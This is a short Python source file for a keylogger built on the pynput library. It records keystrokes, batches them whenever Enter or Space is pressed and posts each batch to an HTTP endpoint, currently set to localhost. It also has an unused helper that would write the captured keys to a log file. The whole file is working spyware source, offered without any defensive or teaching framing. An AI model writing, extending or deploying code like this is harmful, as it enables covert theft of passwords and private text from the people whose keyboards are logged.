import requests
from typing import List
from pynput.keyboard import Key, Listener
import os

char_count = 0
saved_keys = []

API_URL = 'http://127.0.0.1:8000'

def send_log_to_api(log_data: str):
    try:
        response = requests.post(API_URL, data={'log': log_data})
        if response.status_code == 200:
            print("Log successfully sent to the server.")
        else:
            print(f"Failed to send log: {response.status_code}")
    except Exception as e:
        print(f"Error sending log data: {e}")

def on_key_press(key: str):
    try:
        print("Key Pressed: ", key)
    except Exception as ex:
        print("There was an error: ", ex)

def on_key_release(key):
    global saved_keys, char_count

    if key == Key.esc:  # Stop logging when the Escape key is pressed
        return False
    else:
        if key == Key.enter:  # If Enter is pressed, write and send keys
            log_data = ''.join([str(k) for k in saved_keys])
            send_log_to_api(log_data)  # Send the log to the API server
            char_count = 0
            saved_keys = []

        elif key == Key.space:
            key = " "
            log_data = ''.join([str(k) for k in saved_keys])
            send_log_to_api(log_data)  # Send the log to the API server
            saved_keys = []
            char_count = 0

        saved_keys.append(key)
        char_count += 1

def write_to_file(keys: List[str]):
    with open("log.txt", "a") as file:
        for key in keys:
            key = str(key).replace("'", "")
            if "key".upper() not in key.upper():
                file.write(key)
        file.write("\n")

with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    print("Start key logging...")
    listener.join(timeout=10)  # Run for 10 seconds for testing
    print("End key logging...")
